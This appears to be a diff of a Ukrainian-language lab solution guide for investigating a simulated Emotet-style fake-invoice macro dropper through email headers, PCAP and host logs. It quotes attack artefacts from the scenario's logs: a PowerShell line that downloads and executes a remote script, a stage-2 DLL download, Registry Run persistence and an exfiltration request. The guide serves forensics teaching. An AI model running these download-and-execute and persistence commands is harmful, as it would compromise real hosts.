@@ -1,7 +1,10 @@
-# Розбір лабораторної роботи — Сценарій 06: Malware Delivery via Fake Invoice
+# Розбір лабораторної роботи — Сценарій: Malware Delivery via Fake Invoice
 
-**Модуль:** Email Forensics | **Сценарій:** 06 — Fake Invoice (Emotet-style XLSM Dropper)
-**Формат:** Self-Paced | **Мова:** Українська | **Тип:** Student Solution Guide
+**Назва лабораторної:** Email Forensics — Доставка шкідливого ПЗ через підроблений рахунок
+**Модуль:** Аналіз електронної пошти / Аналіз інцидентів
+**Сценарій:** Fake Invoice (Emotet-style XLSM Dropper)
+**Формат:** Self-Paced
+**Версія документу:** 1.0
 
 ---
 
@@ -24,7 +27,10 @@ Action required: Investigate and contain
 
 Твоє завдання — з'ясувати **як** відбувся інцидент, **що** зловмисники отримали, і **скласти технічний звіт** з рекомендаціями.
 
-Середовище для аналізу: **http://localhost:8086**
+Середовище для аналізу доступне двома способами:
+
+- Якщо ви підключені безпосередньо до робочої станції `analyst-workstation` — відкрийте браузер та введіть: http://localhost:8086
+- Якщо ви підключаєтесь віддалено — використовуйте IP-адресу машини: http://192.168.88.202:8086
 
 ---
 
@@ -32,9 +38,11 @@ Action required: Investigate and contain
 
 ### Крок 1.1 — Відкрити веб-поштовий інтерфейс
 
-Відкрий браузер і перейди на `http://localhost:8086`. Ти побачиш папку «Вхідні» з листом позначеним як **⚠ ПІДОЗРІЛИЙ**.
+Відкрий браузер і перейди на `http://localhost:8086` якщо ви знаходитесь в самій машині або `http://192.168.88.202:8086` (ір 192.168.Х.Х дізнатися у викладача). Ти побачиш папку «Вхідні» з листом позначеним як **⚠ ПІДОЗРІЛИЙ**.
 
-[[VISUAL: Скріншот — вхідні повідомлення, червоний badge навпроти листа від billing@ukr-accounting-service.net]]
+
+![Скріншот — вхідні повідомлення, червоний badge навпроти листа від billing@ukr-accounting-service.net](image/image_1.png)
+Скріншот — вхідні повідомлення, червоний badge навпроти листа від billing@ukr-accounting-service.net
 
 ### Крок 1.2 — Переглянути деталі листа
 
@@ -49,7 +57,8 @@ Action required: Investigate and contain
 | DMARC | `FAIL (p=QUARANTINE)` |
 | Вкладення | `Рахунок_фактура_INV-2024-0847.xlsm` |
 
-[[VISUAL: Скріншот — панель IOC з червоними прапорцями SPF FAIL, DMARC FAIL]]
+![Скріншот — панель IOC з червоними прапорцями SPF FAIL, DMARC FAIL](image/image_2.png)
+ Скріншот — панель IOC з червоними прапорцями SPF FAIL, DMARC FAIL
 
 ### Крок 1.3 — Raw Headers
 
@@ -60,19 +69,27 @@ Authentication-Results: mx.techfrontier.com.ua;
        spf=fail (193.201.22.41 is not authorized...)
        dmarc=fail (p=QUARANTINE; pct=100)
 ```
+![Скріншот — Raw Headers](image/image_3.png)
+**Висновок:** IP `193.201.22.41` не авторизований для домену `ukr-accounting-service.net`.
 
-** Висновок:** IP `193.201.22.41` не авторизований для домену `ukr-accounting-service.net`.
-
+![Скріншот — Raw Headers](image/image_4.png)
 ---
+Скріншот — вміст повідомлення з вкладеним документом
+
+### Крок 1.4 — Глибокий аналіз .eml
+
+> 📖 [Повна інструкція з інструментами](email_analysis_lab_1.4.md)
 
 ## Фаза 2 — Аналіз мережевого трафіку (PCAP)
 
 ### Крок 2.1 — Підготовка PCAP
 
 ```bash
-# Скопіювати PCAP з контейнера
-sudo docker cp forensics_sc06_invoice:/root/analysis/traffic.pcap /home/analyst/scenario/sc06.pcap
+# Перевірка PCAP файлу
+ls -lh /home/analyst/scenario/sc06.pcap
+-rwxr-x--- 1 analyst lab_students 128K Apr 30 23:02 /home/analyst/scenario/sc06.pcap
 ```
+![Скріншот — Перевірка PCAP файлу](image/image_5.png)
 
 ### Крок 2.2 — Знайти C2 DNS запит
 
@@ -85,6 +102,7 @@ tcpdump -r /home/analyst/scenario/sc06.pcap port 53 | grep -i "cdn-updates"
 ```
 11:32:30.000000 IP 192.168.5.88.52841 > 192.168.5.1.domain: 21016+ A? cdn-updates-service.com. (41)
 ```
+![Скріншот — Знайти C2 DNS запит](image/image_6.png)
 
 Знайти відповідь з IP (використай Transaction ID з попереднього рядка, наприклад `21016`):
 
@@ -99,7 +117,8 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -n port 53 | grep -A1 "cdn-updates"
 11:32:30.039999 IP 192.168.5.1.53 > 192.168.5.88.52841: 21016 1/0/0 A 185.156.72.11 (57)
 ```
 
-[[VISUAL: Скріншот — два рядки DNS: запит та відповідь з IP 185.156.72.11]]
+![Скріншот — два рядки DNS: запит та відповідь з IP 185.156.72.11](image/image_7.png)
+Скріншот — два рядки DNS: запит та відповідь з IP 185.156.72.11
 
 **IOC:** `cdn-updates-service.com` → `185.156.72.11`
 
@@ -108,8 +127,8 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -n port 53 | grep -A1 "cdn-updates"
 ```bash
 tcpdump -r /home/analyst/scenario/sc06.pcap host 185.156.72.11
 ```
-
-[[VISUAL: Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080]]
+![Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080](image/image_8.png)
+Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080
 
 ### Крок 2.4 — Знайти Excel та PowerShell User-Agent
 
@@ -123,8 +142,8 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -A port 80 | grep -i "excel\|office\
 User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell/5.1.19041.4648)
 ```
-
-[[VISUAL: Скріншот — два рядки User-Agent виділені]]
+![Скріншот — два рядки User-Agent виділені](image/image_9.png)
+Скріншот — два рядки User-Agent виділені
 
 ### Крок 2.5 — Переглянути payload
 
@@ -152,13 +171,16 @@ POST /cdn/check HTTP/1.1
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/7.0)
 ```
 
-[[VISUAL: Скріншот tcpdump -A — три секції виділені]]
+![Скріншот — tcpdump -A — три секції виділені](image/image_10.png)
+![Скріншот — tcpdump -A — три секції виділені](image/image_11.png)
+Скріншот tcpdump -A — три секції виділені
 
 ### Крок 2.6 — Підрахувати beacon
 
 ```bash
 tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /cdn/check"
 ```
+![Скріншот — Підрахувати beacon](image/image_12.png)
 
 **Висновок Фази 2:** 8 C2 beacon (~120с інтервал) до `185.156.72.11:8080`. Спроба ексфільтрації — HTTP 403.
 
@@ -169,7 +191,7 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /
 ### Крок 3.1 — Увійти в контейнер
 
 ```bash
-sudo docker exec -it forensics_sc06_invoice bash
+docker exec -it forensics_sc06_invoice bash
 ```
 
 ### Крок 3.2 — AV Log
@@ -197,8 +219,9 @@ IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSvcHost
 Value: C:\Users\o.koval\AppData\Local\Temp\svchost_helper.dll
 ```
-
-[[VISUAL: Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN]]
+![Скріншот av_alerts.log](image/image_13.png)
+![Скріншот av_alerts.log](image/image_14.png)
+Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN
 
 ### Крок 3.3 — PowerShell Transcript
 
@@ -214,8 +237,9 @@ PS> $wc2.DownloadFile('http://185.156.72.11/stage2/svchost_helper.dll', $tmpPath
 PS> Set-ItemProperty -Path $regPath -Name 'WinSvcHost' -Value $tmpPath
 PS> New-Object System.Threading.Mutex($false, 'Local\WinSvcHostV2')
 ```
+![Скріншот — PowerShell Transcript](image/image_15.png)
 
-[[VISUAL: Скріншот powershell_transcript.log — виділені IEX, DownloadFile, Mutex]]
+Скріншот powershell_transcript.log — виділені IEX, DownloadFile, Mutex
 
 ### Крок 3.4 — Web Access Log
 
@@ -237,8 +261,9 @@ cat /var/log/web/access.log
 # Exfil — заблоковано:
 192.168.5.88 [...] "POST http://cdn-updates-service.com:8080/cdn/telemetry/upload" 403
 ```
-
-[[VISUAL: Скріншот access.log — IOC рядки виділені серед легітимних запитів]]
+![Скріншот — access.log](image/image_16.png)
+![Скріншот — access.log](image/image_17.png)
+Скріншот access.log — IOC рядки виділені серед легітимних запитів
 
 **Висновок Фази 3:** Підтверджено повний ланцюг: email → XLSM → cmd → PowerShell → DLL → Registry Run → Mutex → beacon ×8 → exfil (blocked).
 
@@ -262,8 +287,7 @@ cat /var/log/web/access.log
 ### Крок 4.2 — Скласти звіт
 
 ```bash
-exit   # вийди з контейнера
-nano /home/analyst/scenario/INC-2024-032701_report.txt
+nano /home/student1/INC-2024-032701_report.txt
 ```
 
 **Executive Summary:**
@@ -310,11 +334,9 @@ Host:     Mutex: Local\WinSvcHostV2
 # Ctrl+O → Enter → Ctrl+X
 ```
 
-[[VISUAL: Скріншот заповненого звіту INC-2024-032701_report.txt]]
-
 ---
 
-## Фінальна перевірка
+## ✅ Фінальна перевірка
 
 - [ ] IP відправника: `193.201.22.41`
 - [ ] C2 IP:Port: `185.156.72.11:8080`
@@ -328,127 +350,6 @@ Host:     Mutex: Local\WinSvcHostV2
 
 ---
 
-## 🧹 Cleanup
 
-```bash
-sudo docker compose -f docker-compose.sc06.yml down
-rm /home/analyst/scenario/sc06.pcap
-rm /home/analyst/scenario/INC-2024-032701_report.txt
-```
+*Forensics |  Fake Invoice (Emotet-style XLSM Dropper)| EDUCATIONAL USE ONLY | Rifat Ismailov*
 
----
-
-*ITS/КСЗІ — Email Forensics Lab | Сценарій 06 | EDUCATIONAL USE ONLY | SET University*
-
----
-
-## Додатково: Крок 1.4 — Глибокий аналіз .eml файлу
-
-### Завантажити .eml
-
-Натисни **«Завантажити .eml»** у веб-інтерфейсі або скопіюй з контейнера:
-
-```bash
-sudo docker cp forensics_sc06_invoice:/home/user/email/06_malware_invoice.eml ~/scenario/06_malware_invoice.eml
-```
-
----
-
-### Онлайн інструменти
-
-| Інструмент | URL | Що аналізує |
-|---|---|---|
-| **MXToolbox Email Header Analyzer** | `mxtoolbox.com/EmailHeaders.aspx` | Received chain, SPF, DKIM, DMARC |
-| **Mail Header Analyzer (Google Toolbox)** | `toolbox.googleapps.com/apps/messageheader` | Маршрут листа, затримки між hop |
-| **EML Analyzer** | `eml-analyzer.netlify.app` | Повний аналіз .eml: заголовки, body, вкладення |
-| **PhishTool** | `phishtool.com` | Фішинг аналіз, IOC витяг, OSINT |
-| **AbuseIPDB** | `abuseipdb.com/check/193.201.22.41` | Репутація X-Originating-IP |
-| **VirusTotal** | `virustotal.com` | SHA256 вкладення: `e3b0c44298fc1c149...` |
-| **URLScan.io** | `urlscan.io` | Сканування C2 домену `cdn-updates-service.com` |
-| **MXToolbox SPF Check** | `mxtoolbox.com/spf.aspx` | Перевірити SPF запис домену відправника |
-
----
-
-### Офлайн інструменти
-
-**1. emlAnalyzer (Python)**
-```bash
-# Встановити
-pip install eml-analyzer
-
-# Аналізувати
-emlAnalyzer -i ~/scenario/06_malware_invoice.eml
-
-# Витягнути вкладення
-emlAnalyzer -i ~/scenario/06_malware_invoice.eml --extract
-```
-
-**2. mutt / mailx (переглянути структуру)**
-```bash
-sudo apt install mutt -y
-mutt -f ~/scenario/06_malware_invoice.eml
-```
-
-**3. Python вручну (базовий аналіз)**
-```bash
-python3 - << 'PYEOF'
-import email, email.policy
-
-with open('/home/analyst/scenario/06_malware_invoice.eml', 'rb') as f:
-    msg = email.message_from_bytes(f.read(), policy=email.policy.compat32)
-
-# Ключові заголовки
-for h in ['From','To','Reply-To','Return-Path','X-Originating-IP',
-          'X-Spam-Score','X-Spam-Flag','Date','Message-ID']:
-    print(f"{h}: {msg.get(h,'—')}")
-
-print("\n--- Authentication ---")
-print(msg.get('Authentication-Results','—'))
-
-print("\n--- DKIM ---")
-print(msg.get('DKIM-Signature','—')[:80])
-
-print("\n--- Received chain ---")
-for i, r in enumerate(msg.get_all('Received',[])):
-    print(f"Hop {i+1}: {r.strip()[:80]}")
-PYEOF
-```
-
-**4. Grep по ключових IOC**
-```bash
-# Всі URL у листі
-grep -oE 'https?://[^"<> ]+' ~/scenario/06_malware_invoice.eml
-
-# Tracking pixel
-grep -i "pixel\|track\|1x1\|width.*1.*height.*1" ~/scenario/06_malware_invoice.eml
-
-# Reply-To vs From домени
-grep -E "^(From|Reply-To|Return-Path):" ~/scenario/06_malware_invoice.eml
-
-# Декодувати Subject (base64)
-grep "^Subject:" ~/scenario/06_malware_invoice.eml | \
-  grep -oP '(?<=\?B\?).*(?=\?=)' | base64 -d 2>/dev/null && echo
-```
-
----
-
-### Що шукати при аналізі — чеклист
-
-```
-[ ] From домен ≠ Reply-To домен
-[ ] SPF FAIL — IP відправника не авторизований
-[ ] DKIM FAIL — підпис невалідний або відсутній
-[ ] DMARC FAIL — порушення policy
-[ ] X-Spam-Score > 5.0
-[ ] Received chain містить localhost (підроблений hop)
-[ ] X-Originating-IP — перевірити на AbuseIPDB
-[ ] Subject — base64 decode — прочитати оригінал
-[ ] Tracking pixel у body (img 1×1 на зовнішній домен)
-[ ] Кнопка href ≠ відображуваний текст посилання
-[ ] SHA256 вкладення — перевірити на VirusTotal
-[ ] C2 домен у URL — перевірити на URLScan.io
-```
-
----
-
-*Forensics | Fake Invoice (Emotet-style XLSM Dropper) | EDUCATIONAL USE ONLY | Rifat Ismailov*
